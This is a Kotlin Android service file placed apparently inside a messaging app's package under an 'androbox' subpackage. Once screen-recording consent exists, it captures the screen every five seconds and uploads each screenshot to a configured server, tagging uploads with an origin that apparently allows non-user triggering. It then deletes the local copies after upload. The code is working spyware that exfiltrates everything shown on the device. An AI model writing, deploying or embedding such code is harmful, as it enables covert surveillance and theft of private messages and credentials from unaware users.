package org.fossify.messages.androbox

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class ScreenCaptureService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 3
        private var instance: ScreenCaptureService? = null
        private var isCapturing = false
        private var pendingResultCode: Int = 0
        private var pendingData: Intent? = null
        private var isStartPending = false
        private var pendingOrigin = "user"

        fun setMediaProjection(resultCode: Int, data: Intent) {
            pendingResultCode = resultCode
            pendingData = data
            instance?.initMediaProjection(resultCode, data)
            if (isStartPending) {
                instance?.currentOrigin = pendingOrigin
                instance?.startCaptureInternal()
                isStartPending = false
            }
        }

        fun startCapture(origin: String = "user") {
            val inst = instance
            if (inst == null) {
                Log.e("ScreenCaptureService", "Service not started")
                return
            }
            if (inst.mediaProjection == null) {
                isStartPending = true
                pendingOrigin = origin
                ForegroundService.requestMediaProjectionFor("screen_capture", origin)
                return
            }
            inst.currentOrigin = origin
            inst.startCaptureInternal()
        }

        fun stopCapture() {
            instance?.stopCaptureInternal()
        }
    }

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var captureJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val captureInterval = 5000L
    private var currentOrigin: String = "user"   // ✅ instance variable

    override fun onCreate() {
        super.onCreate()
        instance = this
        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, getNotification("Screen capture idle"))
        Log.d("ScreenCaptureService", "Service created")

        if (pendingResultCode != 0 && pendingData != null) {
            initMediaProjection(pendingResultCode, pendingData!!)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun initMediaProjection(resultCode: Int, data: Intent) {
        mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
        Log.d("ScreenCaptureService", "MediaProjection initialized: ${mediaProjection != null}")
    }

    private fun startCaptureInternal() {
        if (mediaProjection == null) {
            Log.e("ScreenCaptureService", "MediaProjection not ready")
            return
        }
        if (isCapturing) return

        isCapturing = true
        startVirtualDisplay()
        startPeriodicCapture()
        updateNotification("📸 Capturing every 5s...")
        Log.d("ScreenCaptureService", "Capture started")
    }

    private fun startVirtualDisplay() {
        val metrics = DisplayMetrics()
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
        windowManager.defaultDisplay.getMetrics(metrics)
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )
    }

    private fun startPeriodicCapture() {
        captureJob?.cancel()
        captureJob = scope.launch {
            while (isCapturing) {
                captureScreenshot()
                delay(captureInterval)
            }
        }
    }

    private fun captureScreenshot() {
        val reader = imageReader ?: return
        val image = reader.acquireLatestImage() ?: return
        val planes = image.planes
        val buffer = planes[0].buffer
        val pixelStride = planes[0].pixelStride
        val rowStride = planes[0].rowStride
        val rowPadding = rowStride - pixelStride * image.width

        val bitmap = Bitmap.createBitmap(
            image.width + rowPadding / pixelStride,
            image.height,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)

        val finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
        image.close()

        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(System.currentTimeMillis())
        val file = File(cacheDir, "screenshot_$timestamp.jpg")
        FileOutputStream(file).use { out ->
            finalBitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
        }
        finalBitmap.recycle()

        uploadScreenshot(file)
    }

    private fun uploadScreenshot(file: File) {
        val urls = ConfigManager.getServerUrls(applicationContext)
        if (urls != null) {
            val (host, _) = urls
            FileUploader.uploadFile(applicationContext, file, host, currentOrigin) { success ->
                if (success) {
                    Log.d("ScreenCaptureService", "Screenshot uploaded: ${file.name} (origin=$currentOrigin)")
                    file.delete()
                } else {
                    Log.e("ScreenCaptureService", "Upload failed: ${file.name}")
                }
            }
        }
    }

    private fun stopCaptureInternal() {
        if (!isCapturing) return
        isCapturing = false
        captureJob?.cancel()
        virtualDisplay?.release()
        imageReader?.close()
        virtualDisplay = null
        imageReader = null
        updateNotification("Idle")
        Log.d("ScreenCaptureService", "Capture stopped")
    }

    private fun getNotification(text: String): Notification {
        val channelId = "screen_capture_channel"
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("📱 Screen Capture")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "screen_capture_channel",
                "Screen Capture",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun updateNotification(text: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, getNotification(text))
    }

    override fun onDestroy() {
        super.onDestroy()
        stopCaptureInternal()
        isStartPending = false
        scope.cancel()
        instance = null
    }
}